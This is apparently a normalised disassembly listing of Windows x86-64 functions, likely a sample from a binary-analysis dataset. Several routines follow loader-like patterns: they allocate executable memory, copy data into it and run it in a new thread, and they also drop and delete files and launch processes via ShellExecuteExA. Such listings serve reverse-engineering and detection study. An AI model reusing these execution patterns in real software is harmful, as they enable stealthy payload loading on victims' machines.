sub r9d 0x1
movsxd r9 r9d
call sub_408510
mov rcx [ rbp + 0x30 ]
lea rdx [ rbp + 0x80 ]
mov r8 [ rbp + 0x68 ]
call sub_410ed0
mov rax [ rbp + 0x28 ]
mov rax [ rax ]
xor rbx rbx
test rax rax
je r-xdata
lea rcx [ rbp + 0x38 ]
mov rdx [ rbp + 0xc0 ]
call sub_4140a0
mov rcx [ rbp + 0x38 ]
lea rdx [ r-xdata ]
call sub_408c30
test eax eax
jne r-xdata
mov rcx [ rbp + 0x28 ]
lea rdx [ r-xdata ]
call sub_407ca0
jmp r-xdata
lea rcx [ rbp + 0x50 ]
mov rax [ rbp + 0x28 ]
mov rdx [ rax ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x50 ]
mov r8d 0x1
call sub_408db0
mov esi eax
lea rcx [ rbp + 0x48 ]
mov rax [ rbp + 0x28 ]
mov rdx [ rax ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x48 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0x58 ]
mov rdx [ rbp + 0x28 ]
mov rdx [ rdx ]
mov r8d esi
add r8d 0x2
movsxd r8 r8d
mov r9d ebx
sub r9d eax
sub r9d 0x1
movsxd r9 r9d
call sub_408510
mov rcx [ rbp + 0x28 ]
mov rdx [ rbp + 0x80 ]
mov r8 [ rbp + 0x58 ]
call sub_408120
mov ebx [ rax - 0x4 ]
mov rax [ rbp + 0x28 ]
mov rax [ rax ]
xor rcx rcx
test rax rax
je r-xdata
mov rcx [ rbp + 0x28 ]
lea rdx [ r-xdata ]
call sub_407ca0
jmp r-xdata
lea rcx [ rbp + 0x38 ]
mov edx 0x4
call sub_407810
lea rcx [ rbp + 0x58 ]
call sub_407780
lea rcx [ rbp + 0x60 ]
call sub_407730
lea rcx [ rbp + 0x68 ]
call sub_407780
lea rcx [ rbp + 0x70 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x80 ]
mov edx 0x2
call sub_407840
lea rcx [ rbp + 0xc0 ]
call sub_407730
mov rax [ rbp + 0x28 ]
lea rsp [ rbp + 0x90 ]
pop rbx
pop rsi
pop rbp
retn
mov rax [ rbp + 0x28 ]
mov rax [ rax ]
movsxd rcx ecx
cmp [ rax + rcx - 0x1 ] 0x5c
je r-xdata
mov ecx [ rax - 0x4 ]
nop
mov rcx [ rbp + 0x28 ]
lea rdx [ r-xdata ]
call sub_408020
sub_410d90
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x38 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x4
call sub_407810
lea rax [ rbx + rbp + 0x58 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x60 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rax [ rbx + rbp + 0x68 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x70 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x80 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407840
lea rax [ rbx + rbp + 0xc0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_410ed0
push rbp
sub rsp 0x60
mov rbp rsp
mov [ rbp + 0x28 ] rdx
mov [ rbp + 0x38 ] 0x0
mov [ rbp + 0x30 ] 0x0
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x40 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0x80 ] r8
mov rcx [ rbp + 0x80 ]
call sub_4078e0
nop
lea rcx [ rbp + 0x50 ]
mov rdx [ rbp + 0x80 ]
call sub_407d20
lea rcx [ rbp + 0x40 ]
mov rdx [ rbp + 0x50 ]
call sub_408950
lea rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x40 ]
call sub_4140a0
mov rcx [ rbp + 0x48 ]
lea rdx [ r-xdata ]
call sub_408c30
test eax eax
jne r-xdata
lea rcx [ rbp + 0x30 ]
mov rdx [ rbp + 0x50 ]
call sub_408950
lea rcx [ rbp + 0x38 ]
mov rdx [ rbp + 0x30 ]
call sub_4140a0
mov rcx [ rbp + 0x38 ]
lea rdx [ r-xdata ]
call sub_408c30
test eax eax
jne r-xdata
lea rcx [ rbp + 0x58 ]
mov edx 0x104
xor r8 r8
call sub_408650
lea rcx [ rbp + 0x58 ]
call sub_407e70
mov rcx rax
mov edx 0x104
xor r8 r8
call sub_404d90
mov rcx [ rbp + 0x58 ]
call sub_4084e0
mov ecx 0x104
mov rdx rax
call GetTempPathA
lea rcx [ rbp + 0x58 ]
mov edx eax
xor r8 r8
call sub_408650
mov rcx [ rbp + 0x28 ]
mov rdx [ rbp + 0x58 ]
call sub_407ca0
lea rcx [ rbp + 0x58 ]
xor rdx rdx
xor r8 r8
call sub_408650
mov rax [ rbp + 0x28 ]
mov rax [ rax ]
xor rcx rcx
test rax rax
je r-xdata
lea rcx [ rbp + 0x58 ]
mov edx 0x104
xor r8 r8
call sub_408650
lea rcx [ rbp + 0x58 ]
call sub_407e70
mov rcx rax
mov edx 0x104
xor r8 r8
call sub_404d90
mov rcx [ rbp + 0x58 ]
call sub_4084e0
mov rcx rax
mov edx 0x104
call GetSystemDirectoryA
lea rcx [ rbp + 0x58 ]
mov edx eax
xor r8 r8
call sub_408650
mov rcx [ rbp + 0x28 ]
mov rdx [ rbp + 0x58 ]
call sub_407ca0
lea rcx [ rbp + 0x58 ]
xor rdx rdx
xor r8 r8
call sub_408650
mov rax [ rbp + 0x28 ]
mov rax [ rax ]
movsxd rcx ecx
cmp [ rax + rcx - 0x1 ] 0x5c
je r-xdata
mov ecx [ rax - 0x4 ]
nop
lea rcx [ rbp + 0x30 ]
mov edx 0x4
call sub_407810
lea rcx [ rbp + 0x50 ]
mov edx 0x2
call sub_407840
lea rcx [ rbp + 0x80 ]
call sub_407780
mov rax [ rbp + 0x28 ]
lea rsp [ rbp + 0x60 ]
pop rbp
retn
mov rcx [ rbp + 0x28 ]
lea rdx [ r-xdata ]
call sub_408020
sub_4110d0
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x30 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x4
call sub_407810
lea rax [ rbx + rbp + 0x50 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407840
lea rax [ rbx + rbp + 0x80 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_411180
push rbp
push rbx
sub rsp 0xa8
mov rbp rsp
mov [ rbp + 0x30 ] rcx
mov [ rbp + 0x3c ] edx
mov [ rbp + 0x40 ] 0x0
mov [ rbp + 0x80 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x70 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x88 ] 0x0
mov [ rbp + 0x98 ] 0x0
mov [ rbp + 0x90 ] 0x0
mov [ rbp + 0xd0 ] r8
mov [ rbp + 0xd8 ] r9
mov rcx [ rbp + 0xd0 ]
call sub_4078c0
mov rcx [ rbp + 0xd8 ]
call sub_4078c0
mov rcx [ rbp + 0xe0 ]
call sub_4078c0
nop
xor rax rax
mov [ rbp + 0x3b ] al
lea rcx [ rbp + 0x88 ]
mov rdx [ rbp + 0xd0 ]
xor r8 r8
call sub_408720
mov rcx [ rbp + 0x30 ]
lea rdx [ rbp + 0x90 ]
mov r8 [ rbp + 0x88 ]
call sub_40f010
xor rax rax
mov rcx [ rbp + 0x30 ]
mov rcx [ rcx + 0x28 ]
mov edx [ rbp + 0x3c ]
movsxd rdx edx
cmp [ rcx + rdx * 8 ] 0x0
je r-xdata
lea rcx [ rbp + 0x80 ]
mov rdx [ rbp + 0x30 ]
mov rdx [ rdx + 0x28 ]
mov r8d [ rbp + 0x3c ]
movsxd r8 r8d
mov rdx [ rdx + r8 * 8 ]
mov r8d 0x8
mov r9d eax
sub r9d 0x8
movsxd r9 r9d
call sub_408510
lea rcx [ rbp + 0x60 ]
mov rdx [ rbp + 0xd8 ]
xor r8 r8
call sub_408720
mov rcx [ rbp + 0x30 ]
lea rdx [ rbp + 0x68 ]
mov r8 [ rbp + 0x60 ]
call sub_40f010
lea rcx [ rbp + 0x70 ]
mov edx 0x3
lea r8 [ r-xdata ]
mov r9 [ rbp + 0x68 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_4083b0
lea rcx [ rbp + 0x58 ]
mov rdx [ rbp + 0x70 ]
call sub_408950
lea rcx [ rbp + 0x50 ]
mov rdx [ rbp + 0x90 ]
call sub_408950
lea rcx [ rbp + 0x78 ]
mov edx 0x4
mov r8 [ rbp + 0x58 ]
mov r9 [ rbp + 0xe0 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
mov rax [ rbp + 0x50 ]
mov [ rsp + 0x28 ] rax
call sub_408b50
lea rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x78 ]
xor r8 r8
call sub_408720
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
mov rdx [ rbp + 0x80 ]
lea r8 [ r-xdata ]
mov r9 [ rbp + 0x48 ]
call sub_412740
test al al
je r-xdata
mov rax [ rbp + 0x30 ]
mov rax [ rax + 0x28 ]
mov ecx [ rbp + 0x3c ]
movsxd rcx ecx
mov rax [ rax + rcx * 8 ]
mov eax [ rax - 0x4 ]
lea rcx [ rbp + 0x98 ]
xor rdx rdx
xor r8 r8
call sub_408650
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
call sub_412690
nop
lea rcx [ rbp + 0x40 ]
mov rdx [ r-xdata ]
call sub_409890
lea rcx [ rbp + 0x48 ]
call sub_407780
lea rcx [ rbp + 0x50 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x60 ]
mov edx 0x3
call sub_407840
lea rcx [ rbp + 0x78 ]
call sub_407730
lea rcx [ rbp + 0x80 ]
mov edx 0x4
call sub_407840
lea rcx [ rbp + 0xd0 ]
mov edx 0x3
call sub_407810
movzx rax [ rbp + 0x3b ]
lea rsp [ rbp + 0xa8 ]
pop rbx
pop rbp
retn
lea rcx [ rbp + 0x98 ]
mov edx 0x4
xor r8 r8
call sub_408650
lea rcx [ rbp + 0x98 ]
call sub_407e70
mov rbx rax
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x40 ]
call sub_412650
mov rax [ rbp + 0x40 ]
mov rcx rax
mov rdx rbx
mov r8d 0x4
call sub_404ae0
mov rcx [ rbp + 0x98 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
jne r-xdata
mov al 0x1
mov [ rbp + 0x3b ] al
sub_411490
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x40 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
call sub_409890
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x50 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x60 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407840
lea rax [ rbx + rbp + 0x78 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rax [ rbx + rbp + 0x80 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x4
call sub_407840
lea rax [ rbx + rbp + 0xd0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407810
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_4115d0
push rbp
push rbx
sub rsp 0x88
mov rbp rsp
mov [ rbp + 0x30 ] rcx
mov [ rbp + 0x3c ] edx
mov [ rbp + 0x40 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0x70 ] 0x0
mov [ rbp + 0xb0 ] r8
mov [ rbp + 0xb8 ] r9
mov rcx [ rbp + 0xb0 ]
call sub_4078c0
mov rcx [ rbp + 0xb8 ]
call sub_4078c0
nop
xor rax rax
mov [ rbp + 0x3b ] al
lea rcx [ rbp + 0x68 ]
mov rdx [ rbp + 0xb0 ]
xor r8 r8
call sub_408720
mov rcx [ rbp + 0x30 ]
lea rdx [ rbp + 0x70 ]
mov r8 [ rbp + 0x68 ]
call sub_40f010
xor rax rax
mov rcx [ rbp + 0x30 ]
mov rcx [ rcx + 0x28 ]
mov edx [ rbp + 0x3c ]
movsxd rdx edx
cmp [ rcx + rdx * 8 ] 0x0
je r-xdata
lea rcx [ rbp + 0x60 ]
mov rdx [ rbp + 0x30 ]
mov rdx [ rdx + 0x28 ]
mov r8d [ rbp + 0x3c ]
movsxd r8 r8d
mov rdx [ rdx + r8 * 8 ]
mov r8d 0x8
mov r9d eax
sub r9d 0x8
movsxd r9 r9d
call sub_408510
lea rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0xb8 ]
xor r8 r8
call sub_408720
mov rcx [ rbp + 0x30 ]
lea rdx [ rbp + 0x50 ]
mov r8 [ rbp + 0x48 ]
call sub_40f010
lea rcx [ rbp + 0x58 ]
mov edx 0x4
lea r8 [ r-xdata ]
mov r9 [ rbp + 0x50 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
mov rax [ rbp + 0x70 ]
mov [ rsp + 0x28 ] rax
call sub_4083b0
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
mov rdx [ rbp + 0x60 ]
lea r8 [ r-xdata ]
mov r9 [ rbp + 0x58 ]
call sub_412740
test al al
je r-xdata
mov rax [ rbp + 0x30 ]
mov rax [ rax + 0x28 ]
mov ecx [ rbp + 0x3c ]
movsxd rcx ecx
mov rax [ rax + rcx * 8 ]
mov eax [ rax - 0x4 ]
lea rcx [ rbp + 0x78 ]
xor rdx rdx
xor r8 r8
call sub_408650
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
call sub_412690
nop
lea rcx [ rbp + 0x40 ]
mov rdx [ r-xdata ]
call sub_409890
lea rcx [ rbp + 0x48 ]
mov edx 0x7
call sub_407840
lea rcx [ rbp + 0xb0 ]
mov edx 0x2
call sub_407810
movzx rax [ rbp + 0x3b ]
lea rsp [ rbp + 0x88 ]
pop rbx
pop rbp
retn
lea rcx [ rbp + 0x78 ]
mov edx 0x4
xor r8 r8
call sub_408650
lea rcx [ rbp + 0x78 ]
call sub_407e70
mov rbx rax
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x40 ]
call sub_412650
mov rax [ rbp + 0x40 ]
mov rcx rax
mov rdx rbx
mov r8d 0x4
call sub_404ae0
mov rcx [ rbp + 0x78 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
jne r-xdata
mov al 0x1
mov [ rbp + 0x3b ] al
sub_411800
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x40 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
call sub_409890
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x7
call sub_407840
lea rax [ rbx + rbp + 0xb0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_4118d0
push rbp
sub rsp 0x50
mov rbp rsp
mov [ rbp + 0x28 ] rdx
mov [ rbp + 0x30 ] 0x0
mov [ rbp + 0x38 ] 0x0
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x70 ] r8
mov rcx [ rbp + 0x70 ]
call sub_4078e0
nop
lea rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x70 ]
call sub_407d20
jmp r-xdata
lea rcx [ rbp + 0x30 ]
mov rdx [ rbp + 0x48 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x30 ]
mov r8d 0x1
call sub_408db0
test eax eax
jne r-xdata
lea rcx [ rbp + 0x38 ]
mov rdx [ rbp + 0x48 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x38 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0x48 ]
mov edx 0x1
mov r8d eax
call sub_408590
mov rcx [ rbp + 0x28 ]
mov rdx [ rbp + 0x48 ]
call sub_407ca0
nop
lea rcx [ rbp + 0x30 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x48 ]
call sub_407780
lea rcx [ rbp + 0x70 ]
call sub_407780
mov rax [ rbp + 0x28 ]
lea rsp [ rbp + 0x50 ]
pop rbp
retn
sub_4119b0
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x30 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x70 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_411a20
push rbp
sub rsp 0x40
mov rbp rsp
mov [ rbp + 0x30 ] rcx
mov [ rbp + 0x38 ] r8d
mov [ rbp + 0x3c ] r9d
mov [ rbp + 0x58 ] rdx
mov rcx [ rbp + 0x58 ]
call sub_4078e0
nop
xor rax rax
mov [ rbp + 0x2f ] al
mov eax [ rbp + 0x38 ]
test eax eax
je r-xdata
mov rcx [ rbp + 0x30 ]
mov rdx [ rbp + 0x58 ]
mov r8b 0x1
call sub_411b30
test al al
je r-xdata
mov ecx [ rbp + 0x38 ]
mov ecx ecx
mov eax [ rbp + 0x3c ]
imul edx eax 0x3e8
call WaitForSingleObject
mov al 0x1
mov [ rbp + 0x2f ] al
mov rcx [ rbp + 0x58 ]
call sub_4084e0
mov rcx rax
call DeleteFileA
test eax eax
je r-xdata
nop
lea rcx [ rbp + 0x58 ]
call sub_407780
movzx rax [ rbp + 0x2f ]
lea rsp [ rbp + 0x40 ]
pop rbp
retn
mov al 0x1
mov [ rbp + 0x2f ] al
jmp r-xdata
sub_411ae0
push rbp
sub rsp 0x160
mov rbp rsp
mov rcx rdx
call sub_4084e0
mov rcx rax
lea rdx [ rbp + 0x20 ]
call FindFirstFileA
cmp rax 0xffffffffffffffff
je r-xdata
xor rax rax
mov rcx rax
call FindClose
mov eax [ rbp + 0x20 ]
test eax 0x10
sete al
jmp r-xdata
lea rsp [ rbp + 0x160 ]
pop rbp
retn
sub_411b30
push rbp
push rsi
push rbx
sub rsp 0x40
mov rbp rsp
mov rbx rdx
mov esi r8d
mov rcx rbx
call sub_4084e0
mov rcx rax
call GetFileAttributesA
cmp eax 0xffffffff
je r-xdata
call GetLastError
cmp eax 0x2
je r-xdata
mov ecx eax
test ecx 0x400
je r-xdata
xor rax rax
jmp r-xdata
cmp eax 0x3
je r-xdata
test eax 0x10
sete al
jmp r-xdata
test sil sil
jne r-xdata
lea rsp [ rbp + 0x40 ]
pop rbx
pop rsi
pop rbp
retn
cmp eax 0x7b
je r-xdata
test eax 0x10
je r-xdata
mov al 0x1
jmp r-xdata
mov rcx rbp
mov rdx rbx
call sub_411ae0
test al al
jne r-xdata
mov rcx rbx
call sub_4084e0
mov rcx rax
mov edx 0x80000000
mov r8d 0x1
xor r9 r9
mov [ rsp + 0x20 ] 0x3
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x30 ] 0x0
call CreateFileA
cmp rax 0xffffffffffffffff
je r-xdata
xor rax rax
jmp r-xdata
mov al 0x1
call GetLastError
cmp eax 0x20
sete al
jmp r-xdata
mov rcx rax
call CloseHandle
mov al 0x1
jmp r-xdata
sub_411c20
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0x40
mov rbp rsp
mov rbx rdx
mov esi r8d
xor rdi rdi
xor rcx rcx
mov edx esi
mov r8d 0x1000
mov r9d 0x40
call VirtualAlloc
mov r13 rax
test r13 r13
je r-xdata
mov eax edi
lea rsp [ rbp + 0x40 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
mov rcx rbx
mov rdx r13
mov r8d esi
call sub_404ae0
xor rcx rcx
xor rdx rdx
mov r8 r13
xor r9 r9
mov [ rsp + 0x20 ] 0x0
lea rax [ rbp + 0x3c ]
mov [ rsp + 0x28 ] rax
call CreateThread
test eax eax
je r-xdata
mov dil 0x1
sub_411ca0
push rbp
push rbx
sub rsp 0x78
mov rbp rsp
mov [ rbp + 0x58 ] rcx
mov [ rbp + 0x50 ] r8
mov [ rbp + 0x4c ] r9d
mov [ rbp + 0x98 ] rdx
mov rcx [ rbp + 0x98 ]
call sub_4078e0
nop
xor rax rax
mov [ rbp + 0x4b ] al
mov [ rbp + 0x6c ] 0x0
mov rcx [ rbp + 0x58 ]
mov rdx [ rbp + 0x98 ]
mov r8b 0x1
call sub_411b30
test al al
je r-xdata
mov rcx [ rbp + 0x98 ]
call sub_4084e0
mov rcx rax
mov edx 0x40000000
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] 0x2
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x30 ] 0x0
call CreateFileA
mov rbx rax
cmp ebx 0xffffffff
je r-xdata
mov rcx [ rbp + 0x98 ]
call sub_4084e0
mov rcx rax
call DeleteFileA
test eax eax
je r-xdata
mov eax [ rbp + 0x4c ]
cmp [ rbp + 0x6c ] eax
jne r-xdata
mov ecx ebx
mov rdx [ rbp + 0x50 ]
mov r8d [ rbp + 0x4c ]
lea r9 [ rbp + 0x6c ]
mov [ rsp + 0x20 ] 0x0
call WriteFile
mov ecx ebx
call CloseHandle
lea rcx [ rbp + 0x98 ]
call sub_407780
movzx rax [ rbp + 0x4b ]
lea rsp [ rbp + 0x78 ]
pop rbx
pop rbp
retn
nop
mov al 0x1
mov [ rbp + 0x4b ] al
sub_411dc0
push rbp
sub rsp 0xd0
mov rbp rsp
mov [ rbp + 0x38 ] rcx
mov [ rbp + 0x30 ] r9
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x40 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0xe8 ] rdx
mov [ rbp + 0xf0 ] r8
mov rcx [ rbp + 0xe8 ]
call sub_4078e0
mov rcx [ rbp + 0xf0 ]
call sub_4078e0
nop
lea rcx [ rbp + 0x58 ]
mov rdx [ rbp + 0xe8 ]
call sub_407d20
lea rcx [ rbp + 0x50 ]
mov rdx [ rbp + 0xf0 ]
call sub_407d20
xor rax rax
mov [ rbp + 0x2f ] al
mov rcx [ rbp + 0x38 ]
mov rdx [ rbp + 0x58 ]
mov r8b 0x1
call sub_411b30
test al al
jne r-xdata
mov [ rbp + 0x60 ] 0x70
mov [ rbp + 0x64 ] 0x40
mov [ rbp + 0x68 ] 0x0
lea rax [ r-xdata ]
mov [ rbp + 0x70 ] rax
mov rcx [ rbp + 0x58 ]
call sub_4084e0
mov [ rbp + 0x78 ] rax
mov rcx [ rbp + 0x50 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
je r-xdata
lea rcx [ rbp + 0x40 ]
mov rdx [ rbp + 0x58 ]
call sub_408950
lea rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x40 ]
call sub_4140a0
mov rcx [ rbp + 0x48 ]
lea rdx [ r-xdata ]
call sub_408c30
test eax eax
jne r-xdata
lea rax [ r-xdata ]
mov [ rbp + 0x80 ] rax
mov rcx [ rbp + 0x50 ]
call sub_4084e0
mov [ rbp + 0x80 ] rax
jmp r-xdata
lea rcx [ rbp + 0x40 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x50 ]
mov edx 0x2
call sub_407840
lea rcx [ rbp + 0xe8 ]
mov edx 0x2
call sub_407840
movzx rax [ rbp + 0x2f ]
lea rsp [ rbp + 0xd0 ]
pop rbp
retn
nop
mov al 0x1
mov [ rbp + 0x2f ] al
mov [ rbp + 0x88 ] 0x0
mov [ rbp + 0x90 ] 0x0
mov [ rbp + 0x98 ] 0x0
mov [ rbp + 0xa0 ] 0x0
mov [ rbp + 0xa8 ] 0x0
mov [ rbp + 0xb0 ] 0x0
mov [ rbp + 0xb8 ] 0x0
mov [ rbp + 0xc0 ] 0x0
mov [ rbp + 0xc8 ] 0x0
lea rcx [ rbp + 0x60 ]
call ShellExecuteExA
mov eax [ rbp + 0xc8 ]
mov rcx [ rbp + 0x30 ]
mov [ rcx ] eax
cmp [ rbp + 0xc8 ] 0x0
je r-xdata
sub_411fb0
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x40 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x50 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407840
lea rax [ rbx + rbp + 0xe8 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407840
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_412060
push rbp
push rbx
sub rsp 0x88
mov rbp rsp
mov [ rbp + 0x30 ] rcx
mov [ rbp + 0x3c ] edx
mov [ rbp + 0x40 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0x70 ] 0x0
mov [ rbp + 0xb0 ] r8
mov [ rbp + 0xb8 ] r9
mov rcx [ rbp + 0xb0 ]
call sub_4078c0
mov rcx [ rbp + 0xb8 ]
call sub_4078c0
nop
xor rax rax
mov [ rbp + 0x3b ] al
lea rcx [ rbp + 0x68 ]
mov rdx [ rbp + 0xb0 ]
xor r8 r8
call sub_408720
mov rcx [ rbp + 0x30 ]
lea rdx [ rbp + 0x70 ]
mov r8 [ rbp + 0x68 ]
call sub_40f010
xor rax rax
mov rcx [ rbp + 0x30 ]
mov rcx [ rcx + 0x28 ]
mov edx [ rbp + 0x3c ]
movsxd rdx edx
cmp [ rcx + rdx * 8 ] 0x0
je r-xdata
lea rcx [ rbp + 0x60 ]
mov rdx [ rbp + 0x30 ]
mov rdx [ rdx + 0x28 ]
mov r8d [ rbp + 0x3c ]
movsxd r8 r8d
mov rdx [ rdx + r8 * 8 ]
mov r8d 0x8
mov r9d eax
sub r9d 0x8
movsxd r9 r9d
call sub_408510
lea rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0xb8 ]
xor r8 r8
call sub_408720
mov rcx [ rbp + 0x30 ]
lea rdx [ rbp + 0x50 ]
mov r8 [ rbp + 0x48 ]
call sub_40f010
lea rcx [ rbp + 0x58 ]
mov edx 0x4
lea r8 [ r-xdata ]
mov r9 [ rbp + 0x50 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
mov rax [ rbp + 0x70 ]
mov [ rsp + 0x28 ] rax
call sub_4083b0
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
mov rdx [ rbp + 0x60 ]
lea r8 [ r-xdata ]
mov r9 [ rbp + 0x58 ]
call sub_412740
test al al
je r-xdata
mov rax [ rbp + 0x30 ]
mov rax [ rax + 0x28 ]
mov ecx [ rbp + 0x3c ]
movsxd rcx ecx
mov rax [ rax + rcx * 8 ]
mov eax [ rax - 0x4 ]
lea rcx [ rbp + 0x78 ]
xor rdx rdx
xor r8 r8
call sub_408650
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
call sub_412690
nop
lea rcx [ rbp + 0x40 ]
mov rdx [ r-xdata ]
call sub_409890
lea rcx [ rbp + 0x48 ]
mov edx 0x7
call sub_407840
lea rcx [ rbp + 0xb0 ]
mov edx 0x2
call sub_407810
movzx rax [ rbp + 0x3b ]
lea rsp [ rbp + 0x88 ]
pop rbx
pop rbp
retn
lea rcx [ rbp + 0x78 ]
mov edx 0x4
xor r8 r8
call sub_408650
lea rcx [ rbp + 0x78 ]
call sub_407e70
mov rbx rax
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x40 ]
call sub_412650
mov rax [ rbp + 0x40 ]
mov rcx rax
mov rdx rbx
mov r8d 0x4
call sub_404ae0
mov rcx [ rbp + 0x78 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
jne r-xdata
mov al 0x1
mov [ rbp + 0x3b ] al
sub_412290
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
